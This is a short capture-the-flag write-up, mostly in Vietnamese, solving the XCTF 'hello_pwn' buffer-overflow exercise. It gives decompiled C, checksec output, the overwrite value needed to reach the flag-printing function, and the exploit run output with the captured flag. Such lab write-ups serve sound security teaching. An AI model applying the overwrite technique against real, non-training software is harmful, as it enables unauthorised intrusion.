# XCTF - PWN Exercise - hello_pwn

```c
#include<stdio.h>

__int64 sub_400686()
{
  system("cat flag.txt");
  return 0LL;
}

__int64 __fastcall main(int a1, char **a2, char **a3)
{
  alarm(0x3Cu);
  setbuf(stdout, 0LL);
  puts("~~ welcome to ctf ~~     ");
  puts("lets get helloworld for bof");
  read(0, &unk_601068, 0x10uLL);
  if ( dword_60106C == 0x6E756161 )	// 1853186401
    sub_400686();
  return 0LL;
}
```

Kiếm tra các flag secure trước.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/0_hello_pwn λ checksec hello_pwn
[*] '/home/l1j9m4/0_PWNable/ADworld_XCTF/Exersice/0_hello_pwn/hello_pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Chương trình sẽ nhảy đến hàm đọc flag khi biến `dword_60106C` == 0x6E756161, hàm `read()` đọc giá trị cho biến bắt đầu từ `&unk_601068` nằm dưới `dword_60106C` 4 giá trị => ghi đè 4 giá trị junk sau đó là giá trị ta muốn ghi đè vào biến `dword_60106C` khi đó sẽ thỏa mãn điều kiện và nhảy đến hàm đọc flag.

Tiến hành viết file [exploit.py](exploit.py) và khai thác:

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/0_hello_pwn λ python2 exploit.py 
[+] Opening connection to 111.200.241.244 on port 60829: Done
[*] Switching to interactive mode
~~ welcome to ctf ~~     
lets get helloworld for bof
cyberpeace{bcdfef60eb7d186ce56265e8dba38a43}
[*] Got EOF while reading in interactive
$  
```
